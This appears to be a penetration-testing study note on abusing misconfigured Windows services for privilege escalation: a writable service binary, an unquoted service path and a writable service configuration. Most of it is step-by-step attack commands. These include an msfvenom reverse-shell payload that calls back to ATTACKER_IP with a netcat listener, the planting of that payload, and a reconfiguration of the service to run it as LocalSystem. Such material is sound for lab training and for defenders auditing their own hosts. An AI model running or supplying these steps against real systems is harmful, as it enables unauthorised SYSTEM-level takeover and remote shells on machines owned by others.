# Windows — Service Misconfiguration Abuse

Three ways to make a Windows service run *your* file with *its* account's privileges. All three share one shape — **something the service depends on is writable by you** — and one tool chain: `sc.exe` to read the config (the built-in Windows service-control command), `icacls` to test file and folder permissions (also built in), `accesschk` to test the service object's own permissions (a free Microsoft Sysinternals tool that is **not** on the box — you download it on your attack box and copy it over, [[File-Transfer]]), and an `exe-service` payload to land the shell. Ranked easiest-first below; that is also roughly how often each appears.

Services are run by the **[[Security-Terms#^scm|SCM]]** (Service Control Manager). When a service starts, the SCM launches the executable named in the config, under the account named in the config.

## Read the service config first

```cmd
sc qc apphostsvc
```

- `sc qc <service>` → `qc` is **query config**: print how the SCM is set up to start this service. `sc query <service>` tells you only whether it is running; `sc qc` tells you what it runs and as whom, which is the pair of facts this note turns on.
- `BINARY_PATH_NAME` → the executable the SCM runs. Its location and quoting decide vectors 1 and 2.
- `SERVICE_START_NAME` → the account it runs *as*. `LocalSystem` is the jackpot; an unprivileged `svc*` account means a win here is only a lateral hop.
- `sc.exe` in PowerShell — see the warning below; plain `sc` there is a different command.

> [!important] `sc` in PowerShell is not the service tool
> In PowerShell, `sc` is an alias for `Set-Content`. To control services you must type `sc.exe` in full. In `cmd.exe` plain `sc` is fine. Symptom of getting this wrong: `sc stop` silently creates a file called `stop` instead of stopping anything.

## The payload must be `exe-service`

On start, the SCM expects the executable to call back and report "I'm running" within ~30 seconds (the SCM handshake). A plain reverse-shell `.exe` never makes that call: you *may* catch a shell, but the SCM decides the service hung, kills the process, and your shell dies with it.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o rev.exe
```

- `msfvenom` → Metasploit's payload generator. It runs **on your attack box**, writes a file, and touches the target not at all; it ships with Kali and with any Metasploit install.
- `-p windows/x64/shell_reverse_tcp` → which payload to build: a 64-bit Windows program that opens a TCP connection back to you and hands your end a command prompt. Match the architecture to the target — `windows/shell_reverse_tcp` is the 32-bit name.
- `-f exe-service` → wraps the payload so it answers the SCM *and* spawns the shell in a child that outlives the handshake. This is the flag that matters; `-f exe` here is the single most common reason "the exploit worked but my shell died".
- `-o rev.exe` → the file to write. Leave it out and msfvenom prints raw binary to your terminal.
- your **listener** → the program on your box that waits for that connection. Start it *before* you trigger anything: `nc -lvnp 4444` (netcat: `-l` listen, `-v` verbose so you see the connect, `-n` no DNS lookups, `-p` port), and the port must be the number you put in `LPORT`.
- `LHOST`/`LPORT` → your listener's address and port, baked into the binary. Wrong `LHOST` (your [[Security-Terms#^vpn|VPN]] vs your [[Security-Terms#^lan|LAN]] address) means the shell dials a number that does not answer.

After dropping the payload where another account will execute it, open it up so that account can:

```cmd
icacls C:\path\to\rev.exe /grant Everyone:RX
```

- `/grant Everyone:RX` → the service account is not you, so without a grant it may not be able to read or execute the file you just dropped, and the service fails to start with nothing in your listener. `RX` is read and execute, which is all it needs; `F` is full control and hands over write as well, which nothing here uses.

## Vector 1 — writable service binary

```cmd
sc qc <service>
```

```cmd
icacls "C:\Path\To\service.exe"
```

- `icacls` on the binary → the built-in command that prints a file's access control list. Read it for a **principal** — the user or group an entry names — that **you are** (`whoami /groups` first, which lists every group you belong to) holding `F`, `M`, or `W`. `Everyone:(M)` or `BUILTIN\Users:(M)` on a service binary is the finding.

Overwrite it — rename, do not delete, so the real binary survives:

```cmd
cd "C:\Path\To"
```

```cmd
move service.exe service.exe.bak
```

```cmd
move C:\Users\you\rev.exe service.exe
```

```cmd
icacls service.exe /grant Everyone:RX
```

```cmd
sc stop <service> & sc start <service>
```

- `move` → renames or moves a file. Renaming the real binary to `.bak` rather than deleting it means you can put the service back afterwards, which matters on anything that is not a throwaway lab host.
- `/grant Everyone:RX` → lets every account read and execute the file you just planted, because the service account is not you and by default cannot read a file you created. Read and execute is the whole requirement; full control would be handing out more than the vector needs.
- `&` → cmd.exe's "run this, then run that" separator, so the stop and the start happen in one line. The restart is what makes the SCM launch your file; without it nothing happens until the host reboots.

## Vector 2 — unquoted service path

```powershell
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -notlike '*\Windows\*' } | Select-Object Name,StartMode,PathName
```

- `-notlike '"*'` → keep only services whose `PathName` does **not** begin with a double quote. That is the whole defect: a quoted path is immune, because the quotes tell the SCM exactly what to run.
- The single quotes around `'"*'` are load-bearing. The pattern itself contains a double quote, so the double-quoted spelling needs escaping and usually ends up matching nothing — and a `-notlike` that matches nothing excludes nothing, so the full list comes back and the host looks full of findings.
- `-notlike '*\Windows\*'` → drops Microsoft's own services, which are hundreds of rows and none of the answer. The leading `*` is mandatory: `PathName` starts with `C:`, so without it the filter excludes zero rows and you read 200 lines believing you filtered.
- `StartMode` is the column the write-up version of this command drops, and it decides whether the vector pays out today: `Auto` means the service starts at boot, so your planted binary runs at the next reboot without you needing the right to restart anything. `Manual` or `Disabled` means you need a trigger as well as a write.
- Roughly 200 services in, 5-15 past the `C:\Windows` filter, 0-3 that are both unquoted **and** carry a space inside the executable path. Only that last group is this vector.

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v /c:"C:\Windows" | findstr /v """
```

- The `cmd` fallback, for a shell with no PowerShell — and note `wmic` is gone entirely on Windows 11 and Server 2025, which is a missing tool, not an answer.
- The second `findstr` drops the correctly quoted paths, and `"""` is how a literal double quote is written as a findstr search string — three of them, no `/c:`, because there is no space to protect. It is the fragile part of the line: if it swallows everything or nothing, drop that filter and read the `PathName` column yourself. After the `C:\Windows` filter that is 5-15 rows, not 200.

Windows resolves an unquoted path left to right and runs the first thing that exists, so if you can write a file at one of the earlier names, the SCM runs yours instead. You are testing whether any earlier path segment sits in a folder you can write.

```text
BINARY_PATH_NAME : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

`cmd` splits an unquoted command on spaces, so the SCM tries each of these in order, running the first that exists:

```text
C:\MyPrograms\Disk.exe
C:\MyPrograms\Disk Sorter.exe
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

A properly quoted path — `"C:\...\disksrs.exe"` — is immune; the quotes tell the SCM exactly what to run. Test the *directory*, not the file:

```cmd
icacls C:\MyPrograms
```

- Look for your principal with `(AD)` **append data / add subdirectory** or `(WD)` **write data / add file** — either lets you create the planted `.exe`. `(F)`/`(M)` on the folder work too.
- Testing the file instead of the folder is the mistake here: the file ACL denies you, you stop, and never check that the *folder* lets you drop a new file beside it.

Plant at the earlier name and restart:

```cmd
move C:\Users\you\rev.exe C:\MyPrograms\Disk.exe
```

```cmd
icacls C:\MyPrograms\Disk.exe /grant Everyone:RX
```

```cmd
sc stop <service> & sc start <service>
```

## Vector 3 — writable service configuration (DACL)

```cmd
accesschk64.exe -qlc <service>
```

- `accesschk64.exe` → a free Microsoft Sysinternals tool that prints the permissions on an object. It is not on the box: on Kali, `wget https://download.sysinternals.com/files/AccessChk.zip` then `unzip` it, and copy `accesschk64.exe` to the target ([[File-Transfer]]), taking the `64` build on a 64-bit host. Older releases prompt to accept a licence on first run; add `/accepteula` to the command so it does not hang waiting for a click in a non-interactive shell.
- `-c` → treat the argument as a service name.
- `-l` → dump the DACL (who may do what to the service).
- `-q` → drop the banner. Add `-v` to spell out each right.

Reconfigure and restart:

```cmd
sc config <service> binPath= "C:\Users\you\rev.exe" obj= LocalSystem
```

```cmd
sc stop <service> & sc start <service>
```

- `binPath=` → the executable the SCM will run from now on. Point it at your planted payload.
- `obj=` → the account the service will run as. `LocalSystem` is the built-in account that outranks any administrator and needs no password, which is why this vector reaches SYSTEM whatever the service was running as before.

> [!important] The space after each `=` is mandatory
> `sc config` syntax is `option= value` — the space goes **after** the equals sign, not before. `binPath="..."` (no space) is silently misparsed; `binPath= "..."` is correct. This is the single most common reason this vector "doesn't work".
